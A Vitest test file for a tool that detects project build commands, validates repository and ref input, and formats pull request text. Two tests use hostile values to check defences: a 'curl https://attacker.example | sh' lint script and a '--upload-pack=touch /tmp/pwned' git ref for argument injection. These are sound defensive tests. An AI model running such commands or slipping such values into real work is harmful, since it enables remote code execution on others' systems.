import { describe, expect, it } from "vitest";

import { detectProject } from "./detect";
import { ShipAPrInputSchema } from "./input";
import { branchName, commitMessage, pullRequestBody, slug } from "./pr";
import { type ShipTestReport } from "./schema";

const present = (...names: string[]) => new Set(names);

describe("detectProject", () => {
  it("reads node scripts and picks the package manager from the lockfile", () => {
    const profile = detectProject({
      present: present("package.json", "pnpm-lock.yaml"),
      packageJson: JSON.stringify({
        scripts: { test: "vitest run", lint: "eslint .", typecheck: "tsc --noEmit" },
      }),
    });
    expect(profile).toMatchObject({ ecosystem: "node", packageManager: "pnpm" });
    expect(profile.commands.install?.argv).toEqual(["pnpm", "install", "--frozen-lockfile"]);
    expect(profile.commands.test?.argv).toEqual(["pnpm", "run", "test"]);
    expect(profile.commands.lint?.argv).toEqual(["pnpm", "run", "lint"]);
    expect(profile.commands.typecheck?.argv).toEqual(["pnpm", "run", "typecheck"]);
  });

  it("ignores npm's placeholder test script and never runs script bodies as argv", () => {
    const profile = detectProject({
      present: present("package.json"),
      packageJson: JSON.stringify({
        scripts: {
          test: 'echo "Error: no test specified" && exit 1',
          lint: "curl https://attacker.example | sh",
        },
      }),
    });
    expect(profile.commands.test).toBeNull();
    expect(profile.commands.install?.argv).toEqual(["npm", "install"]);
    expect(profile.commands.lint?.argv).toEqual(["npm", "run", "lint"]);
  });

  it("detects python projects with uv, pytest and ruff", () => {
    const profile = detectProject({
      present: present("pyproject.toml", "uv.lock"),
      pyproject: "[tool.pytest.ini_options]\n[tool.ruff]\n",
    });
    expect(profile.commands.install?.argv).toEqual(["uv", "sync"]);
    expect(profile.commands.test?.argv).toEqual(["uv", "run", "pytest", "-q"]);
    expect(profile.commands.lint?.argv).toEqual(["uv", "run", "ruff", "check", "."]);
  });

  it("falls back to Makefile targets and to nothing at all", () => {
    expect(
      detectProject({ present: present("Makefile"), makefile: "test:\n\tgo test ./...\nlint:\n" })
        .commands.test?.argv,
    ).toEqual(["make", "test"]);
    expect(detectProject({ present: present() }).ecosystem).toBe("unknown");
  });
});

describe("Ship-a-PR input", () => {
  const improvement = {
    id: "imp-1",
    title: "Add tests",
    rationale: "Untested parser",
    files: ["src/parse.ts"],
    kind: "test",
    effort: "S",
    acceptance: ["Parser has tests"],
  };

  it("accepts a GitHub URL with an optional ref", () => {
    expect(
      ShipAPrInputSchema.safeParse({ repoUrl: "https://github.com/a/b", ref: "main", improvement })
        .success,
    ).toBe(true);
  });

  it.each([
    ["https://gitlab.com/a/b", undefined],
    ["/tmp/repo", undefined],
    ["https://github.com/a/b", "--upload-pack=touch /tmp/pwned"],
    ["https://github.com/a/b", "main..evil"],
  ])("rejects repo %s with ref %s", (repoUrl, ref) => {
    expect(
      ShipAPrInputSchema.safeParse({ repoUrl, ...(ref === undefined ? {} : { ref }), improvement })
        .success,
    ).toBe(false);
  });
});

describe("pull request text", () => {
  const improvement = {
    id: "IMP 7: Add Tests!",
    title: "Add parser tests",
    rationale: "The parser has no tests.",
    files: [],
    kind: "test" as const,
    effort: "S" as const,
    acceptance: ["Covers empty input", "Covers unicode"],
  };
  const report = (passed: boolean): ShipTestReport => ({
    phase: passed ? "after" : "baseline",
    test: { command: "npm test", exitCode: passed ? 0 : 1, passed, durationMs: 1500 },
    lint: null,
    typecheck: null,
    testOutput: "",
  });

  it("builds safe branch names and conventional commit messages", () => {
    expect(slug("IMP 7: Add Tests!")).toBe("imp-7-add-tests");
    expect(branchName(improvement, "run_1")).toMatch(/^delegate\/imp-7-add-tests-[0-9a-f]{7}$/);
    expect(commitMessage(improvement, "run_1").split("\n")[0]).toBe("test: Add parser tests");
  });

  it("includes rationale, an acceptance checklist, test evidence and the footer", () => {
    const body = pullRequestBody({
      improvement,
      baseline: report(false),
      after: report(true),
      files: [
        { path: "src/parse.test.ts", status: "added", mode: "100644", additions: 20, deletions: 0 },
      ],
      runId: "run_1",
    });
    expect(body).toContain("The parser has no tests.");
    expect(body).toContain("- [ ] Covers empty input");
    expect(body).toContain(
      "| Tests | `npm test` | failed (exit 1, 1.5 s) | passed (exit 0, 1.5 s) |",
    );
    expect(body).toContain("`src/parse.test.ts` (added, +20 −0)");
    expect(body).toContain("Produced by Delegate");
  });
});
